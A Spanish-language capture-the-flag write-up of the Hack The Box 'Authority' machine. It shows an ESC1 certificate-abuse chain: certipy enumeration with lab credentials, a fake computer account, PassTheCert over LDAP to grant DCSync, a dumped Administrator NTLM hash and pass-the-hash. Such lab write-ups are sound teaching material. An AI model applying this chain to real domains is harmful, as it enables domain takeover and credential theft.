---
title: "ESC1 + DC sin soporte PKINIT → PassTheCert → DCSync"
date: 2026-03-10
categories:
  - Hack The Box
  - Windows
tags:
  - Active Directory
  - AD CS
  - ESC1
  - Certificate Abuse
  - PKINIT
  - PassTheCert
  - DCSync
  - Domain Computers
  - LDAP
  - Pass-the-Hash
  - Privilege Escalation
  - Evil-WinRM
  - HTB
  - certipy
layout: single
author_profile: true
show_date: true
toc: true
---

## ¿Por qué algunos DCs no soportan PKINIT?

Cuando exploto ESC1 y obtengo un `.pfx` como Administrator, el flujo normal es usar ese certificado para autenticarme vía Kerberos y obtener un TGT — esto se llama **PKINIT** (Public Key Cryptography for Initial Authentication in Kerberos).

El problema es que **PKINIT no es universal**. Para que funcione, el DC necesita tener configurado el servicio de autenticación por certificado, lo que implica que:

- El DC debe tener instalado y configurado **AD CS** con soporte explícito para smart card / certificate logon
- Debe existir un mapeo válido entre el certificado y el objeto de usuario en el directorio (vía SID o UPN)
- La CA que emitió el certificado debe ser de confianza para el KDC

En entornos donde AD CS fue desplegado de forma básica o con configuraciones mínimas, el KDC simplemente no tiene habilitado el soporte para este tipo de pre-autenticación y responde con `KDC_ERR_PADATA_TYPE_NOSUPP`. Esto no significa que el certificado sea inútil — significa que hay que buscar otra vía para aprovecharlo, y esa vía es **autenticación LDAP con el certificado directamente**, saltando Kerberos por completo.

---

## Escenario: HTB Authority

Cuento con credenciales de `svc_ldap : lDaP_1n_th3_cle4r!` obtenidas previamente a través del portal PWM mal configurado. Con esto enumero AD CS y encuentro el template **CorpVPN** vulnerable a **ESC1**.

---

## 1. Enumeración del Template Vulnerable

```bash
┌──(kali㉿kali)-[~/Desktop/HTB/authority/content]
└─$ certipy-ad find -u 'svc_ldap' -p 'lDaP_1n_th3_cle4r!' -target AUTHORITY.HTB -dc-ip 10.129.229.56 -stdout -vulnerable
Certipy v5.0.4 - by Oliver Lyak (ly4k)

[*] Finding certificate templates
[*] Found 37 certificate templates
[*] Finding certificate authorities
[*] Found 1 certificate authority
[*] Found 13 enabled certificate templates
[*] Finding issuance policies
[*] Found 21 issuance policies
[*] Found 0 OIDs linked to templates
[*] Retrieving CA configuration for 'AUTHORITY-CA' via RRP
[!] Failed to connect to remote registry. Service should be starting now. Trying again...
[*] Successfully retrieved CA configuration for 'AUTHORITY-CA'
[*] Checking web enrollment for CA 'AUTHORITY-CA' @ 'authority.authority.htb'
[!] Error checking web enrollment: [Errno 111] Connection refused
[!] Use -debug to print a stacktrace
[*] Enumeration output:
Certificate Authorities
  0
    CA Name                             : AUTHORITY-CA
    DNS Name                            : authority.authority.htb
    Certificate Subject                 : CN=AUTHORITY-CA, DC=authority, DC=htb
    Certificate Serial Number           : 2C4E1F3CA46BBDAF42A1DDE3EC33A6B4
    Certificate Validity Start          : 2023-04-24 01:46:26+00:00
    Certificate Validity End            : 2123-04-24 01:56:25+00:00
    Web Enrollment
      HTTP
        Enabled                         : False
      HTTPS
        Enabled                         : False
    User Specified SAN                  : Disabled
    Request Disposition                 : Issue
    Enforce Encryption for Requests     : Enabled
    Active Policy                       : CertificateAuthority_MicrosoftDefault.Policy
    Permissions
      Owner                             : AUTHORITY.HTB\Administrators
      Access Rights
        ManageCa                        : AUTHORITY.HTB\Administrators
                                          AUTHORITY.HTB\Domain Admins
                                          AUTHORITY.HTB\Enterprise Admins
        ManageCertificates              : AUTHORITY.HTB\Administrators
                                          AUTHORITY.HTB\Domain Admins
                                          AUTHORITY.HTB\Enterprise Admins
        Enroll                          : AUTHORITY.HTB\Authenticated Users
Certificate Templates
  0
    Template Name                       : CorpVPN
    Display Name                        : Corp VPN
    Certificate Authorities             : AUTHORITY-CA
    Enabled                             : True
    Client Authentication               : True
    Enrollment Agent                    : False
    Any Purpose                         : False
    Enrollee Supplies Subject           : True
    Certificate Name Flag               : EnrolleeSuppliesSubject
    Enrollment Flag                     : IncludeSymmetricAlgorithms
                                          PublishToDs
                                          AutoEnrollmentCheckUserDsCertificate
    Private Key Flag                    : ExportableKey
    Extended Key Usage                  : Encrypting File System
                                          Secure Email
                                          Client Authentication
                                          Document Signing
                                          IP security IKE intermediate
                                          IP security use
                                          KDC Authentication
    Requires Manager Approval           : False
    Requires Key Archival               : False
    Authorized Signatures Required      : 0
    Schema Version                      : 2
    Validity Period                     : 20 years
    Renewal Period                      : 6 weeks
    Minimum RSA Key Length              : 2048
    Template Created                    : 2023-03-24T23:48:09+00:00
    Template Last Modified              : 2023-03-24T23:48:11+00:00
    Permissions
      Enrollment Permissions
        Enrollment Rights               : AUTHORITY.HTB\Domain Computers
                                          AUTHORITY.HTB\Domain Admins
                                          AUTHORITY.HTB\Enterprise Admins
      Object Control Permissions
        Owner                           : AUTHORITY.HTB\Administrator
        Full Control Principals         : AUTHORITY.HTB\Domain Admins
                                          AUTHORITY.HTB\Enterprise Admins
        Write Owner Principals          : AUTHORITY.HTB\Domain Admins
                                          AUTHORITY.HTB\Enterprise Admins
        Write Dacl Principals           : AUTHORITY.HTB\Domain Admins
                                          AUTHORITY.HTB\Enterprise Admins
        Write Property Enroll           : AUTHORITY.HTB\Domain Admins
                                          AUTHORITY.HTB\Enterprise Admins
    [+] User Enrollable Principals      : AUTHORITY.HTB\Domain Computers
    [!] Vulnerabilities
      ESC1  
```

Certipy identifica **CorpVPN** como vulnerable a ESC1. Las tres condiciones que lo hacen explotable son:

- `Enrollee Supplies Subject: True` → puedo especificar libremente el UPN en el SAN, lo que me permite impersonar a cualquier usuario, incluyendo Administrator
- `Client Authentication: True` → el certificado resultante sirve para autenticarse en el dominio
- `Enrollment Rights: Domain Computers` → solo cuentas de computadora pueden solicitar este template

El tercer punto es el que complica la solicitud directa con `svc_ldap`, ya que es una cuenta de usuario y no de computadora. Así que primero necesito crear una.

---

## 2. Crear una Cuenta de Computadora Falsa

Uso `impacket-addcomputer` para agregar una computadora al dominio con las credenciales de `svc_ldap`. Esto es posible porque por defecto en Active Directory cualquier usuario autenticado puede unir hasta **10 computadoras** al dominio (atributo `ms-DS-MachineAccountQuota`).

[![](/assets/images/176.png)](/assets/images/176.png)

Esto me da una cuenta `FAKEBOX$` que sí pertenece al grupo **Domain Computers** y por lo tanto tiene derecho de enroll en el template CorpVPN.

---

## 3. Solicitar el Certificado como Administrator (ESC1)

Con las credenciales de `FAKEBOX$` solicito el certificado especificando el UPN de Administrator en el SAN. Esto es el núcleo de ESC1: el template no valida que el solicitante sea realmente el usuario que declara en el certificado.

[![](/assets/images/177.png)](/assets/images/177.png)

La CA emite el certificado sin validar la identidad real del solicitante frente al UPN declarado. El resultado es `administrator.pfx` — un certificado que acredita ser Administrator.

---

## 4. Intento de Autenticación PKINIT — Error

El flujo estándar sería usar ese `.pfx` para obtener un TGT de Kerberos:

[![](/assets/images/178.png)](/assets/images/178.png)

Pero el DC responde con:

```
KDC_ERR_PADATA_TYPE_NOSUPP (KDC has no support for padata type)
```

El KDC no tiene habilitado PKINIT, así que no puede procesar pre-autenticación basada en certificados. El TGT no se emite. **El certificado sigue siendo válido — solo necesito una ruta diferente para usarlo.**

---

## 5. Extraer el Certificado y la Clave del PFX

La alternativa es usar el certificado para autenticarme directamente contra **LDAP** en lugar de Kerberos. Para eso necesito el `.crt` y el `.key` por separado:

[![](/assets/images/179.png)](/assets/images/179.png)

Estos dos archivos me permiten establecer una sesión LDAP autenticada con el certificado del Administrator, sin pasar por Kerberos en ningún momento.

---

## 6. PassTheCert — Otorgar DCSync a svc_ldap

Con `PassTheCert` uso el certificado para autenticarme en LDAP como Administrator y desde ahí modificar el objeto `svc_ldap` en el directorio, otorgándole permisos de **DCSync** (DS-Replication-Get-Changes + DS-Replication-Get-Changes-All).

[![](/assets/images/180.png)](/assets/images/180.png)

La herramienta confirma: `Granted user 'svc_ldap' DCSYNC rights!`

Esto funciona porque LDAP sí acepta autenticación por certificado (SASL EXTERNAL / TLS client auth), a diferencia del KDC en este DC. Ahora `svc_ldap` puede replicar el directorio como si fuera un Domain Controller.

---

## 7. DCSync — Dumping de Credenciales

Con los permisos de replicación ya asignados, ejecuto DCSync con `secretsdump`:

[![](/assets/images/181.png)](/assets/images/181.png)

Obtengo los hashes NTLM de todos los usuarios del dominio, incluyendo:

```
Administrator:500:aad3b435b51404eeaad3b435b51404ee:6961f422924da90a6928197429eea4ed:::
```

---

## 8. Pass-the-Hash → Shell como Administrator

Verifico el hash y me conecto al DC

[![](/assets/images/182.png)](/assets/images/182.png)

---

## Resumen de la Cadena de Ataque

```
svc_ldap (credenciales) 
  → Enumeración AD CS → CorpVPN vulnerable a ESC1
  → Crear FAKEBOX$ (Domain Computer)
  → Solicitar certificado con UPN=administrator@authority.htb
  → PKINIT bloqueado por el DC
  → Extraer .crt y .key del PFX
  → PassTheCert vía LDAP → DCSync rights a svc_ldap
  → secretsdump → Hash NTLM de Administrator
  → Pass-the-Hash → evil-winrm → SYSTEM
```

---

## Por qué funciona PassTheCert cuando PKINIT no funciona

| Protocolo         | Autenticación por certificado              | ¿Funciona en Authority? |
| ----------------- | ------------------------------------------ | ----------------------- |
| Kerberos (PKINIT) | Requiere configuración explícita en el KDC | No soportado            |
| LDAP (SASL/TLS)   | Nativo en cualquier DC con LDAPS activo    | Funciona                |

LDAP acepta el certificado como identidad porque el DC tiene LDAPS activo en el puerto 636, y el certificado lleva el UPN de Administrator como SAN — el directorio lo toma como prueba de identidad válida. No necesita que el KDC lo valide.
